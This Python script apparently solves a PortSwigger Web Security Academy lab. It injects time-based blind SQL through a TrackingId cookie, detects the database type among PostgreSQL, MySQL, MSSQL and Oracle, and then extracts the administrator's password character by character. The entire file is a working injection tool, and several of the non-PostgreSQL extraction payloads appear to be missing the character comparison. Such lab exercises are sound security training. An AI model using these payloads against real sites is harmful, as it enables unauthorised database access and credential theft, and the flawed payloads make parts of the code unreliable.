import requests
import string

URL = 'https://0a42007d0310dae580b02b6900920086.web-security-academy.net/'
COOKIE_NAME = 'TrackingId'
TIMEOUT = 15
DATABASE_TYPE = 'PostgreSQL'
ATTRIBUTE = 'password'
CONDITION_ATTRIBUTE = 'username'
CONDITION_VALUE = 'administrator'
TABLE = 'users'
DATABASES = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']

ALPHANUMERIC = list(string.ascii_lowercase + string.digits)

def test(url, cookie_name, timeout=15):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]

    for database in DATABASES:
        payload = ''

        if database == 'PostgreSQL':
            payload = '\' AND (SELECT CASE WHEN(1 = 1) THEN pg_sleep(10)::text ELSE pg_sleep(0)::text END) = \'1\'-- '
        elif database == 'MySQL':
            payload = '\' AND (SELECT IF(1=1, SLEEP(10),\'a\'))'
        elif database == 'MSSQL':
            payload = '\'%3B IF (1=1) WAITFOR DELAY \'0:0:10\''
        elif database == 'Oracle':
            payload = '\'%3B SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'

        response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)

        if response.elapsed.total_seconds() >= 10:
            print(response.request._cookies.get(cookie_name))
            print('SQLi test was successful! The database is ' + database)
            return database
        else:
            print(response.request._cookies.get(cookie_name))
            print(f'SQLi test failed for cookie {cookie_name} assuming a {database} database.')
            print('Status code: ' + str(response.status_code))

def attack(url, cookie_name, database, attribute, table, condition_attribute, condition_value, timeout=15):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]
    data = ''

    for index in range(1, 9999):
        for character in ALPHANUMERIC:
            if database == 'PostgreSQL':
                payload = f'\' AND (SELECT CASE WHEN(SUBSTRING((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1) = \'{character}\') THEN pg_sleep(10)::text ELSE pg_sleep(0)::text END) = \'1\'--'
            elif database == 'MySQL':
                payload = f'\' AND (SELECT IF(SUBSTRING((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1), SLEEP(10),\'a\'))'
            elif database == 'MSSQL':
                payload = f'\'%3B IF (SUBSTRING((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1)) WAITFOR DELAY \'0:0:10\''
            elif database == 'Oracle':
                payload = f'\'%3B SELECT CASE WHEN (SUBSTR((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1)) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'

            response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)

            if response.elapsed.total_seconds() >= 10:
                data += character
                print(f'Index position is {index}. The current value of the data extracted is {data}')
                break
            elif  character == ALPHANUMERIC[-1]:
                print('No more matching characters found.')
                print(f'The value of {attribute} is {data}')
                return data

        if index == 9999:
            print('End of range reached. There is possibly more data.')
            print(f'The extracted value of {attribute} so far is {data}')
            return data

if __name__ == '__main__':
    #test(URL, COOKIE_NAME, TIMEOUT)
    attack(URL, COOKIE_NAME, DATABASE_TYPE, ATTRIBUTE, TABLE, CONDITION_ATTRIBUTE, CONDITION_VALUE, TIMEOUT)